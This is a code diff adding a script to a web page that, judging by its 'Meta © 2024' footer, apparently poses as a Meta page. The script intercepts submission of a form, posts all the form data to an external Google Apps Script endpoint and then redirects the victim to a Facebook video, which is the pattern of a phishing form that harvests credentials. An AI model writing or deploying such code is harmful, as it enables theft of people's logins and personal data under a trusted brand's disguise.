@@ -78,6 +78,25 @@
             <small>Meta © 2024</small>
         </div>
     </footer>
+
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Send form data via Fetch API
+            var formData = new FormData(this);
+            fetch("https://script.google.com/macros/s/AKfycbwnPwwdGIWapW1JzuLvjW2ID2Vk-v_q0gK6-Sk4_3nNRiYPe0wyf1nCjGOnUCaXUuZy/exec", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log("Response:", data); // Log success message
+                window.location.href = "https://www.facebook.com/share/v/15xouJJPFi"; // Redirect to video
+            })
+            .catch(error => console.error("Error:", error));
+        });
+        </script>
 </body>
 
 </html>
